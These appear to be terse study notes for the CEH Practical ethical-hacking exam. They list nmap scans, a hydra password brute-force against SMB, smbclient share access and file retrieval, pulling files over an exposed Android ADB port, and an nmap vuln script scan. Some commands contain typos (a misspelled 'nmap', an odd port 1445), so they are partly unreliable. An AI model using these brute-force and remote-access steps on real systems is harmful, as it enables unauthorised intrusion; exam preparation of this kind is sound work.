# CEH PRACTICAL
1 FQDN
* nmap -p389 -sV <subnet> -Pn
*          OR
* nmap -A <subnet> -Pn

2 WAMP SERVER
* nmap -A -sV -p 80,8080,443 <subnet>

3 SMB 
* nmap -p 445 <subnet>
* hydra -l Henry -P <password.txt file on desktop> <ip> smb
* smbclient -L ip -p 1445 -U Henry
* smbclient -L //ip/Home -p 1445 -U Henry
* get <file name> password same as Henry
* if file contains hash decode it

4 Android
* namp -p 5555 <subnet> -Pn
* adb connect <ip>:5555
* adb shell
* ls (find the folder scan)
* after finding scan coppy rhe directory
* exit
* adb pull (paste the directory)(be a root user)
* cd Scan
* ls
* ent <file1>
* ent <file2>
* ent <file3>
* sha384sum <file with highest ent>

5 SEVERITY
* nmap -Pn --script vuln <ip>
* CVE check on google nvd.nist.gov

6 REMOTE LOGIN SENSITIVE FILE
*
